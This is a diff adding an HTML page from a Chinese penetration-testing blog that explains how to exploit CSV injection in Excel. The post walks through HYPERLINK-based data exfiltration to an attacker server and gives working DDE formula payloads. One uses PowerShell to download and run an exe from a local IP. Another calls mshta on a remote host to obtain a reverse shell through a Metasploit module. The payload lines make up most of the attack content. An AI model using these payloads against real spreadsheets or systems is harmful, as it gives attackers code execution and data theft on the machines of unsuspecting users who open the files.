@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="网站在未经验证的情况下将不受信任的用户输入嵌入CSV文件时，就可能会发生CSV注入。当用户使用Excel打开CSV文件时，该软件会将任何以&#x3D;开头的单元格解释为公式。 以下是可以用来注入恶意payload的一些功能。 excel中的超链接函数语法：HYPERLINK(link_location, [friendly_name])  命令执行Excel提供了DDE（Dynamic Data Excha">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVS注入漏洞利用">
+<meta property="og:url" content="https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="乌兹永远的神">
+<meta property="og:description" content="网站在未经验证的情况下将不受信任的用户输入嵌入CSV文件时，就可能会发生CSV注入。当用户使用Excel打开CSV文件时，该软件会将任何以&#x3D;开头的单元格解释为公式。 以下是可以用来注入恶意payload的一些功能。 excel中的超链接函数语法：HYPERLINK(link_location, [friendly_name])  命令执行Excel提供了DDE（Dynamic Data Excha">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://imgkr.cn-bj.ufileos.com/ebfd433e-a7f4-4d6e-be13-ab43e2ffe6bd.png">
+<meta property="og:image" content="https://imgkr.cn-bj.ufileos.com/f53a2e41-1ee5-4b43-9630-e700afb5486c.png">
+<meta property="og:image" content="https://imgkr.cn-bj.ufileos.com/a9c28ac7-82e6-47c8-adc6-f37226eec0ef.png">
+<meta property="og:image" content="https://imgkr.cn-bj.ufileos.com/2d559b02-8a3e-45cd-b158-ee5a4d751c49.png">
+<meta property="og:image" content="https://imgkr.cn-bj.ufileos.com/81d539ac-7e39-4ed6-bc34-118eabe48693.png">
+<meta property="og:image" content="https://imgkr.cn-bj.ufileos.com/69753de9-7ee6-4acb-b6c6-a6977498176b.png">
+<meta property="og:image" content="https://imgkr.cn-bj.ufileos.com/6147bd2e-ab00-403f-8cb8-7cba5bd8dd5d.png">
+<meta property="og:image" content="https://imgkr.cn-bj.ufileos.com/239d0810-31f0-4367-8b36-81408d386daa.png">
+<meta property="article:published_time" content="2020-06-01T14:23:55.000Z">
+<meta property="article:modified_time" content="2020-06-04T06:47:16.000Z">
+<meta property="article:author" content="upkn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imgkr.cn-bj.ufileos.com/ebfd433e-a7f4-4d6e-be13-ab43e2ffe6bd.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>CVS注入漏洞利用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Category</a></li>
+         
+          <li><a href="/friendlinks">Friendlink</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/06/01/Gitee%E4%B8%83%E5%91%A8%E5%B9%B4%E7%A0%81%E5%8A%9B%E6%A3%80%E6%B5%8B1-4%E5%85%B3writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/05/31/ThinkCMF%E6%A1%86%E6%9E%B6%E4%BB%BB%E6%84%8F%E5%86%85%E5%AE%B9%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&text=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&is_video=false&description=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVS注入漏洞利用&body=Check out this article: https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&name=CVS注入漏洞利用&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&t=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#excel中的超链接函数"><span class="toc-number">1.</span> <span class="toc-text">excel中的超链接函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-number">2.</span> <span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用方式"><span class="toc-number"></span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#窃取信息"><span class="toc-number">1.</span> <span class="toc-text">窃取信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下载并执行exe"><span class="toc-number">2.</span> <span class="toc-text">下载并执行exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mshta"><span class="toc-number">3.</span> <span class="toc-text">mshta</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学习地址"><span class="toc-number"></span> <span class="toc-text">学习地址</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CVS注入漏洞利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">乌兹永远的神</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-01T14:23:55.000Z" itemprop="datePublished">2020-06-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>网站在未经验证的情况下将不受信任的用户输入嵌入CSV文件时，就可能会发生CSV注入。当用户使用Excel打开CSV文件时，该软件会将任何以<code>=</code>开头的单元格解释为公式。</p>
+<p>以下是可以用来注入恶意payload的一些功能。</p>
+<h3 id="excel中的超链接函数"><a href="#excel中的超链接函数" class="headerlink" title="excel中的超链接函数"></a>excel中的超链接函数</h3><p>语法：<code>HYPERLINK(link_location, [friendly_name])</code></p>
+<p><img src="https://imgkr.cn-bj.ufileos.com/ebfd433e-a7f4-4d6e-be13-ab43e2ffe6bd.png" alt=""></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>Excel提供了DDE（Dynamic Data Exchange，动态数据交换）功能，可以在Excel窗口中执行命令。<br>要在excel上打开记事本，使用以下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;cmd|’ &#x2F;C notepad’!’A1′</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://imgkr.cn-bj.ufileos.com/f53a2e41-1ee5-4b43-9630-e700afb5486c.png" alt=""></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="窃取信息"><a href="#窃取信息" class="headerlink" title="窃取信息"></a>窃取信息</h3><p>在字段中输入超链接，该链接将直接从excel中导出内容。当用户单击超链接时，敏感数据将发生到攻击者服务器。</p>
+<p><img src="https://imgkr.cn-bj.ufileos.com/a9c28ac7-82e6-47c8-adc6-f37226eec0ef.png" alt=""></p>
+<p>攻击者服务器：</p>
+<p><img src="https://imgkr.cn-bj.ufileos.com/2d559b02-8a3e-45cd-b158-ee5a4d751c49.png" alt=""></p>
+<h3 id="下载并执行exe"><a href="#下载并执行exe" class="headerlink" title="下载并执行exe"></a>下载并执行exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;cmd|&#39; &#x2F;C powershell Invoke-WebRequest &quot;http:&#x2F;&#x2F;192.168.239.1&#x2F;Ascgen2.exe&quot; -OutFile &quot;$env:Temp\Ascgen2.exe&quot;; Start-Process &quot;$env:Temp\Ascgen2.exe&quot;&#39;!A1</span><br></pre></td></tr></table></figure>
+
+<h3 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h3><p>需要利用PS_shell.rb脚本，GitHub下载地址：<a href="https://github.com/starnightcyber/CVE-2017-11882/blob/master/PS_shell.rb" target="_blank" rel="noopener">PS_shell.rb</a></p>
+<p>下载后将PS_shell.rb脚本放到/usr/share/metasploit-framework/modules/exploits/windows/目录下。</p>
+<p>在msf中执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure>
+
+<p>重新加载脚本，然后执行如下命令：</p>
+<p><img src="https://imgkr.cn-bj.ufileos.com/81d539ac-7e39-4ed6-bc34-118eabe48693.png" alt=""></p>
+<p>现在，只需要执行 <code>mshta.exe &quot;http://192.168.43.95:8080/csvtest&quot;</code>这个命令就可以得到一个反弹的shell。</p>
+<p>在csv文件中，插入下面的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;cmd|&#39; &#x2F;C mshta.exe &quot;http:&#x2F;&#x2F;192.168.43.95:8080&#x2F;csvtest&quot;&#39;!A1</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://imgkr.cn-bj.ufileos.com/69753de9-7ee6-4acb-b6c6-a6977498176b.png" alt=""></p>
+<p>点击链接后会出现安全提示：</p>
+<p><img src="https://imgkr.cn-bj.ufileos.com/6147bd2e-ab00-403f-8cb8-7cba5bd8dd5d.png" alt=""></p>
+<p>点击是后就能看到机器上线：</p>
+<p><img src="https://imgkr.cn-bj.ufileos.com/239d0810-31f0-4367-8b36-81408d386daa.png" alt=""></p>
+<h2 id="学习地址"><a href="#学习地址" class="headerlink" title="学习地址"></a>学习地址</h2><ul>
+<li><p><a href="https://www.freebuf.com/vuls/195656.html" target="_blank" rel="noopener">浅谈CSV注入漏洞</a></p>
+</li>
+<li><p>[CSV Injection](</p>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Category</a></li>
+         
+          <li><a href="/friendlinks">Friendlink</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#excel中的超链接函数"><span class="toc-number">1.</span> <span class="toc-text">excel中的超链接函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-number">2.</span> <span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用方式"><span class="toc-number"></span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#窃取信息"><span class="toc-number">1.</span> <span class="toc-text">窃取信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下载并执行exe"><span class="toc-number">2.</span> <span class="toc-text">下载并执行exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mshta"><span class="toc-number">3.</span> <span class="toc-text">mshta</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#学习地址"><span class="toc-number"></span> <span class="toc-text">学习地址</span></a>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&text=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&is_video=false&description=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVS注入漏洞利用&body=Check out this article: https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&name=CVS注入漏洞利用&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://adkinguzi.github.io/2020/06/01/CVS%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&t=CVS注入漏洞利用" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2020
+    upkn
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories">Category</a></li>
+         
+          <li><a href="/friendlinks">Friendlink</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
